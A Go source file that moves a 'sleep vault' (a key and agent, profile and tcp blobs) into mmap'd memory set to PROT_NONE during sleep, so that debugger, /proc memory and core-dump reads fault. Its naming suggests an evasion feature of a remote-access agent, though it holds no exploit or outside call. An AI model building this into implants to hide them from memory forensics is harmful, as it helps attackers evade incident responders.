//go:build linux || darwin

package main

import (
	"golang.org/x/sys/unix"
)

// guardedPages tracks an mmap'd memory region used to protect vault data
// during sleep with PROT_NONE. This is the Unix equivalent of the Windows
// VirtualAlloc + PAGE_NOACCESS approach — any process attempting to read
// this memory (ptrace, /proc/PID/mem, core dump extraction) triggers SIGSEGV.
type guardedPages struct {
	data []byte // mmap'd region (passed to Mprotect and Munmap)
	// Offsets and lengths for reconstructing vault data on wake
	keyLen     int
	agentOff   int
	agentLen   int
	profileOff int
	profileLen int
	tcpOff     int
	tcpLen     int
}

// guardSleepPages moves vault data from Go heap to mmap'd anonymous memory
// and sets pages to PROT_NONE. The Go heap copies are zeroed.
// Returns nil if vault is nil or allocation fails (non-fatal).
func guardSleepPages(vault *sleepVault) *guardedPages {
	if vault == nil || vault.key == nil {
		return nil
	}

	totalSize := len(vault.key)
	g := &guardedPages{keyLen: len(vault.key)}

	g.agentOff = totalSize
	g.agentLen = len(vault.agentBlob)
	totalSize += g.agentLen

	g.profileOff = totalSize
	g.profileLen = len(vault.profileBlob)
	totalSize += g.profileLen

	g.tcpOff = totalSize
	g.tcpLen = len(vault.tcpBlob)
	totalSize += g.tcpLen

	if totalSize == 0 {
		return nil
	}

	pageSize := unix.Getpagesize()
	allocSize := (totalSize + pageSize - 1) &^ (pageSize - 1)

	data, err := unix.Mmap(-1, 0, allocSize,
		unix.PROT_READ|unix.PROT_WRITE,
		unix.MAP_PRIVATE|unix.MAP_ANON)
	if err != nil {
		return nil
	}
	g.data = data

	copy(data[0:], vault.key)
	if g.agentLen > 0 {
		copy(data[g.agentOff:], vault.agentBlob)
	}
	if g.profileLen > 0 {
		copy(data[g.profileOff:], vault.profileBlob)
	}
	if g.tcpLen > 0 {
		copy(data[g.tcpOff:], vault.tcpBlob)
	}

	zeroBytes(vault.key)
	zeroBytes(vault.agentBlob)
	zeroBytes(vault.profileBlob)
	zeroBytes(vault.tcpBlob)
	vault.key = nil
	vault.agentBlob = nil
	vault.profileBlob = nil
	vault.tcpBlob = nil

	if err := unix.Mprotect(g.data, unix.PROT_NONE); err != nil {
		_ = unix.Munmap(data)
		return nil
	}

	return g
}

// unguardSleepPages restores vault data from PROT_NONE pages back to Go
// heap slices, then zeros and unmaps the guarded pages.
func unguardSleepPages(guard *guardedPages, vault *sleepVault) {
	if guard == nil || vault == nil || guard.data == nil {
		return
	}

	if err := unix.Mprotect(guard.data, unix.PROT_READ|unix.PROT_WRITE); err != nil {
		return
	}

	vault.key = make([]byte, guard.keyLen)
	copy(vault.key, guard.data[0:guard.keyLen])

	if guard.agentLen > 0 {
		vault.agentBlob = make([]byte, guard.agentLen)
		copy(vault.agentBlob, guard.data[guard.agentOff:guard.agentOff+guard.agentLen])
	}
	if guard.profileLen > 0 {
		vault.profileBlob = make([]byte, guard.profileLen)
		copy(vault.profileBlob, guard.data[guard.profileOff:guard.profileOff+guard.profileLen])
	}
	if guard.tcpLen > 0 {
		vault.tcpBlob = make([]byte, guard.tcpLen)
		copy(vault.tcpBlob, guard.data[guard.tcpOff:guard.tcpOff+guard.tcpLen])
	}

	for i := range guard.data {
		guard.data[i] = 0
	}
	_ = unix.Munmap(guard.data)
	guard.data = nil
}
